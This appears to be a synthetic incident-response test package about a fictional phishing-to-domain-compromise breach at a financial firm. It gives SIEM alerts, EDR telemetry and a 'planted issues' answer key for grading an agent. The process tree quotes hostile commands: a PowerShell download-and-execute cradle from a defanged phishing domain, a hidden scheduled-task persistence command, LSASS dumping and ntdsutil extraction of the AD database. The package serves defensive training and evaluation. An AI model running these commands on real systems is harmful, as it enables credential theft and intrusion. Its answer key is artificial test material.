# Incident Data Package — Suspected Compromise at Lakefield Financial Services

## Environment Overview
- **Company:** Lakefield Financial Services (mid-size, ~2,000 employees)
- **Industry:** Financial services (SEC-regulated, SOC 2 Type II certified)
- **Infrastructure:** Hybrid — on-prem Active Directory, Azure AD hybrid join, M365, on-prem file servers, Palo Alto firewalls
- **Security Stack:** CrowdStrike Falcon (EDR), Splunk Enterprise Security (SIEM), Palo Alto NGFW, Proofpoint email gateway, Microsoft Defender for Office 365
- **Detection Timeline:** March 18-20, 2026 (48 hours of activity)

---

## SIEM Alert Timeline

| Timestamp (UTC) | Alert ID | Severity | Rule | Source | Description |
|-----------------|----------|----------|------|--------|-------------|
| 03/18 14:22 | SIEM-4401 | Medium | Proofpoint: Suspicious URL Click | emily.chen@lakefield.com | User clicked URL in email — link to external site mimicking DocuSign. Email from "contracts@docusign-verify.com." |
| 03/18 14:24 | SIEM-4402 | Low | Web Proxy: Uncategorized URL | WS-ECHEN (10.10.25.47) | HTTPS connection to hxxps://docusign-verify[.]com/auth/callback — not in web categorization database |
| 03/18 14:31 | SIEM-4403 | Medium | CrowdStrike: Suspicious Process | WS-ECHEN | powershell.exe launched by WINWORD.EXE with encoded command (-enc flag) |
| 03/18 14:32 | SIEM-4404 | High | CrowdStrike: Credential Access | WS-ECHEN | Process accessed LSASS memory (credential dumping indicator) — PID 7284, parent: powershell.exe |
| 03/18 14:35 | SIEM-4405 | Medium | CrowdStrike: Persistence | WS-ECHEN | Scheduled task created: "Windows Update Service" — executes PowerShell script from C:\ProgramData\update.ps1 every 4 hours |
| 03/18 15:01 | SIEM-4406 | Medium | Firewall: Outbound to Uncategorized IP | WS-ECHEN (10.10.25.47) | HTTPS connection to 185.220.101[.]47:443 — not in any threat intel feed at this time. Connection duration: 45 seconds. |
| 03/18 15:15 | SIEM-4407 | Low | Firewall: Repeated Outbound | WS-ECHEN | Second connection to 185.220.101[.]47:443 — 14 minutes after first. Duration: 38 seconds. |
| 03/18 17:30 | SIEM-4408 | Low | Firewall: Repeated Outbound | WS-ECHEN | Third connection to 185.220.101[.]47:443 — consistent ~15 minute interval. Jitter: ±90 seconds. |
| 03/19 02:14 | SIEM-4409 | High | AD: Unusual Login — Off-Hours | FS-FIN01 (10.10.40.12) | emily.chen account logged into file server FS-FIN01 at 02:14 UTC (10:14 PM local). Emily Chen is CFO's EA — no history of off-hours file server access. |
| 03/19 02:16 | SIEM-4410 | Medium | CrowdStrike: Lateral Movement | FS-FIN01 | PsExec.exe used to execute command on FS-FIN01 from WS-ECHEN. Service installed: PSEXESVC. |
| 03/19 02:22 | SIEM-4411 | High | CrowdStrike: Discovery | FS-FIN01 | Commands executed: `dir /s /b \\FS-FIN01\finance$\*Q4*2025*`, `dir /s /b \\FS-FIN01\finance$\*earnings*`, `dir /s /b \\FS-FIN01\finance$\*board*` |
| 03/19 02:28 | SIEM-4412 | High | CrowdStrike: Collection | FS-FIN01 | 7-Zip (7z.exe) used to create archive: C:\Windows\Temp\update_pkg.7z — source: multiple files from \\FS-FIN01\finance$ share |
| 03/19 02:35 | SIEM-4413 | High | Firewall: Large Outbound Transfer | FS-FIN01 → WS-ECHEN → 185.220.101[.]47 | 247 MB transferred outbound over HTTPS to 185.220.101[.]47 in a single session (38 minutes). |
| 03/19 08:45 | SIEM-4414 | Medium | AD: Service Account Login | DC01 (10.10.10.5) | svc_backup account authenticated to DC01 via NTLM. svc_backup is a service account for Veeam backup — no scheduled backup jobs at this time. |
| 03/19 09:02 | SIEM-4415 | High | CrowdStrike: Credential Access | DC01 | ntdsutil.exe invoked — "activate instance ntds" followed by "ifm" (create Install From Media snapshot). This extracts the AD database (ntds.dit) and SYSTEM registry hive. |
| 03/20 06:00 | SIEM-4416 | Low | Firewall: Continued Beaconing | WS-ECHEN | C2 beaconing continues. 96 connections in last 24 hours. Interval: 15 min ± 90 sec. |

---

## EDR Telemetry — WS-ECHEN (Emily Chen's Workstation)

### Process Tree (March 18, 14:22-14:35)

```
OUTLOOK.EXE (PID 3412)
└── WINWORD.EXE (PID 5891) — opened attachment "Contract_Review_2026.docm"
    └── powershell.exe (PID 6204) — command: powershell.exe -nop -w hidden -enc <base64 blob, 4KB>
        ├── powershell.exe (PID 7284) — decoded: IEX(New-Object Net.WebClient).DownloadString('hxxps://docusign-verify[.]com/update.ps1')
        │   ├── [Memory] Accessed lsass.exe (PID 648) — Read process memory (Mimikatz-style credential dump)
        │   └── [Registry] Created: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateSvc
        └── schtasks.exe (PID 7301) — /create /tn "Windows Update Service" /tr "powershell.exe -ep bypass -f C:\ProgramData\update.ps1" /sc hourly /mo 4
```

### File Activity
| Time | Action | Path | Hash (SHA256) |
|------|--------|------|---------------|
| 14:31 | Write | C:\ProgramData\update.ps1 | a3f8d2...7b4c1e (not in VT — 0/72 detections at time of incident) |
| 14:32 | Write | C:\Windows\Temp\debug.log | Contains NTLM hashes — output of credential dump |
| 02:28 (03/19) | Write | C:\Windows\Temp\update_pkg.7z | Archive containing files from FS-FIN01 finance$ share |

### Network Connections (WS-ECHEN → External)
| Destination | Port | Protocol | First Seen | Last Seen | Connections (48h) | Pattern |
|------------|------|----------|-----------|----------|-------------------|---------|
| 185.220.101[.]47 | 443 | HTTPS | 03/18 15:01 | 03/20 06:00 | 192 | Beacon: 15 min ± 90 sec. Session length: 30-120 sec. Consistent with Cobalt Strike malleable C2. |
| docusign-verify[.]com (104.21.XX.XX) | 443 | HTTPS | 03/18 14:24 | 03/18 14:32 | 3 | Initial payload download. Domain registered 03/15/2026 via Namecheap. |

---

## Active Directory Events — Selected

| Timestamp | Event ID | Source | Description |
|-----------|----------|--------|-------------|
| 03/18 14:32 | 4688 | WS-ECHEN | New process: powershell.exe, parent: WINWORD.EXE, user: LAKEFIELD\emily.chen |
| 03/18 14:32 | 4663 | WS-ECHEN | Object accessed: lsass.exe process memory, by PID 7284 |
| 03/19 02:14 | 4624 | FS-FIN01 | Logon Type 3 (Network): LAKEFIELD\emily.chen — source IP: 10.10.25.47 (WS-ECHEN) |
| 03/19 02:16 | 7045 | FS-FIN01 | Service installed: PSEXESVC — Service File: %SystemRoot%\PSEXESVC.exe |
| 03/19 08:45 | 4624 | DC01 | Logon Type 3 (Network): LAKEFIELD\svc_backup — source IP: 10.10.25.47 (WS-ECHEN) |
| 03/19 08:45 | 4672 | DC01 | Special privileges assigned: LAKEFIELD\svc_backup — SeBackupPrivilege, SeRestorePrivilege |
| 03/19 09:02 | 4688 | DC01 | New process: ntdsutil.exe, user: LAKEFIELD\svc_backup |

---

## Threat Intelligence Enrichment (post-detection)

| IOC | Type | Intel |
|-----|------|-------|
| 185.220.101[.]47 | IPv4 | Known Cobalt Strike team server. Associated with FIN7/Carbanak APT cluster (Mandiant). First reported 03/01/2026. Hosting: M247 Ltd (Romania). |
| docusign-verify[.]com | Domain | Registered 03/15/2026 via Namecheap. WHOIS privacy. Resolves to Cloudflare. Categorized as phishing by VirusTotal (14/92 engines). |
| a3f8d2...7b4c1e | SHA256 | update.ps1 — 0/72 on VT at detection. Post-submission: flagged by 8/72 engines as Cobalt Strike stager. YARA match: CobaltStrike_Stager_Encoded. |
| PSEXESVC.exe | Tool | Legitimate SysInternals tool. Used for lateral movement. ATT&CK: T1570 (Lateral Tool Transfer), T1021.002 (SMB/Windows Admin Shares). |

---

## PLANTED ISSUES (for evaluation — agent should catch these)

### Issue 1 — Initial Access via Spear Phishing (T1566.001)
Emily Chen clicked a link in a phishing email impersonating DocuSign. The email came from "contracts@docusign-verify[.]com" — a domain registered 3 days before the attack. This opened a macro-enabled Word document ("Contract_Review_2026.docm") that launched encoded PowerShell. The initial access vector is clear: spear phishing with a malicious document. The agent should identify this as T1566.001 (Spear Phishing Attachment) or T1566.002 (Spear Phishing Link) and note that the phishing domain was newly registered.

### Issue 2 — Credential Dumping via LSASS Access (T1003.001)
The PowerShell process (PID 7284) accessed LSASS memory — this is credential harvesting (Mimikatz-style). The output was written to C:\Windows\Temp\debug.log containing NTLM hashes. This gave the attacker credentials for emily.chen's session and potentially cached credentials for other users/service accounts. The agent must identify this as T1003.001 (LSASS Memory) and flag that the svc_backup service account credentials were likely obtained here (explaining how the attacker later accessed DC01 using svc_backup).

### Issue 3 — Command and Control Beaconing to Known Cobalt Strike Infrastructure (T1071.001)
192 connections over 48 hours to 185.220.101[.]47 on port 443, with 15-minute intervals ± 90 seconds jitter. This is textbook Cobalt Strike beacon behavior — consistent interval with configured jitter to evade basic detection. Post-incident threat intel confirms this IP as a known Cobalt Strike team server associated with FIN7. The agent must identify the C2 channel, note the beaconing pattern, and recommend immediate blocking of this IP at the firewall and DNS level.

### Issue 4 — Lateral Movement to File Server + Data Staging and Exfiltration (T1021.002, T1560.001, T1041)
At 02:14 UTC on 03/19, the attacker used emily.chen's credentials to access FS-FIN01 (file server) via PsExec. They ran directory listing commands specifically targeting financial data ("Q4", "earnings", "board" — keywords indicating pre-earnings financial data). Files were archived with 7-Zip into C:\Windows\Temp\update_pkg.7z, then 247 MB was exfiltrated to the C2 server. The agent must identify this as a multi-stage operation: lateral movement (T1021.002), file/directory discovery (T1083), data staged (T1074.001), archive collected data (T1560.001), and exfiltration over C2 channel (T1041). The targeted search for earnings and board materials at a financial services company suggests the attacker may be seeking material non-public information (MNPI) for insider trading — this is a potential securities fraud angle.

### Issue 5 — Domain Controller Compromise via Service Account (T1078.002)
At 08:45 on 03/19, the svc_backup service account authenticated to DC01 from WS-ECHEN. This service account has SeBackupPrivilege (can read any file, including AD database). At 09:02, ntdsutil.exe was used to create an IFM snapshot — extracting ntds.dit (the AD database containing all password hashes) and the SYSTEM registry hive. This means the attacker now has EVERY credential in the domain. The agent must identify this as the highest severity finding — domain-level compromise. Recovery requires assuming ALL accounts are compromised and performing a full credential reset (all users, all service accounts, KRBTGT twice).

### Issue 6 — Service Account with Excessive Privileges
svc_backup has domain admin-equivalent access (SeBackupPrivilege, SeRestorePrivilege on the domain controller). A backup service account should be configured with the minimum permissions required — typically backup operator group, not domain admin. The fact that this account could be used to extract the AD database indicates a privilege management failure. Additionally, the account authenticated via NTLM (not Kerberos), which may indicate the account doesn't have SPN configured or the attacker is using pass-the-hash. The agent should flag this as both an active incident finding and a systemic security gap: service accounts with excessive privileges are a persistent risk that enabled this escalation.
